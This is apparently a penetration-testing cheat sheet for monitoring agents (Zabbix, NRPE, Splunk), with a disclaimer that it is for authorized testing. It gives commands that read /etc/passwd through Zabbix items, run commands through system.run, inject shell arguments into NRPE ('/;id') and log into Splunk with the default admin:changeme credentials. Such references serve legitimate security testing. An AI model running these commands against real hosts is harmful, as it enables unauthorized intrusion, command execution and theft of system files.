---
service: monitoring
title: Monitoring Agents (Zabbix / NRPE / Splunk)
ports: 10050, 10051, 5666, 8089
aliases: zabbix-agent, zabbix-server, nrpe, splunkd
---

# Monitoring agents — quick wins

**When you see it:** Zabbix agent (10050) / server (10051), Nagios NRPE (5666), or Splunk
management (8089) — monitoring agents run on *every* host and often execute commands by
design. A Zabbix agent with `EnableRemoteCommands` or an NRPE with `dont_blame_nrpe`/arg
support is direct RCE. aranum stays on read-side metric queries + version fingerprints.

> Authorized testing only. Triage is read-only. Remote-command / command-injection paths
> (marked ✏️) execute on the monitored host — get sign-off before triggering them.

## Triage (read-only)
```sh
nc -nv -w 4 H 10050                                    # Zabbix agent reachable?
(printf 'agent.version'; ) | nc -w4 H 10050            # agent version (passive item)
nmap -sV --script zabbix-agent-info -p 10050 H
/usr/lib/nagios/plugins/check_nrpe -H H                # NRPE version banner
curl -sk https://H:8089/services/server/info -u : 2>/dev/null | head   # Splunk mgmt
```

## Quick wins

### Zabbix agent — read arbitrary items
```sh
printf 'system.run[cat /etc/passwd]' | nc -w4 H 10050          # only if EnableRemoteCommands
printf 'vfs.file.contents[/etc/passwd]' | nc -w4 H 10050
```
*Why:* passive items like `vfs.file.contents[...]` read files as the zabbix user; `system.run[...]`
is outright command execution when `EnableRemoteCommands=1` is set in `zabbix_agentd.conf`
(the ✏️ path). Test `agent.version` first to confirm reachability.

### NRPE — command enumeration / arg injection ✏️
```sh
check_nrpe -H H -c check_users                         # list-configured command
check_nrpe -H H -c check_disk -a '/;id'                # arg injection if dont_blame_nrpe=1
```
*Why:* NRPE runs predefined commands; with `dont_blame_nrpe=1` (allows client args) a `$ARG$`
in a command definition becomes shell injection → RCE as the nagios user.

### Splunk management API — version + auth check
```sh
curl -sk https://H:8089/services/server/info -u admin:changeme | grep -i version
```
*Why:* 8089 is the Splunk management port; `admin:changeme` was the historic default, and the
authenticated REST API allows scripted-input creation → RCE. The unauth `/services/server/info`
at minimum leaks version for CVE mapping.

## aranum helpers
- `aranumtoolkit/network/enum-monitoring.sh` — dispatcher (Zabbix agent/server, NRPE, Splunk mgmt; read-side metric queries + version fingerprints).

## Gotchas
- Zabbix agent by default only answers hosts in its `Server=` allowlist — a non-allowlisted source gets a connection but a `ZBX_NOTSUPPORTED`/refused item; spoofing the server IP may be needed.
- `EnableRemoteCommands` is off by default in modern Zabbix — the file-read items still work when the agent is reachable.
- NRPE without SSL (or with `check_nrpe -n`) is the common case in labs; production NRPE often enforces TLS + `allowed_hosts`.
- Splunk 8089 uses a self-signed cert (`curl -k`); default creds are usually changed on real deployments — confirm version and pivot to known CVEs.

## Sources
- Zabbix agent item/`system.run` docs; NRPE `dont_blame_nrpe` advisories; Splunk REST API reference; HackTricks Zabbix/Splunk notes; aranum iteration I-G.
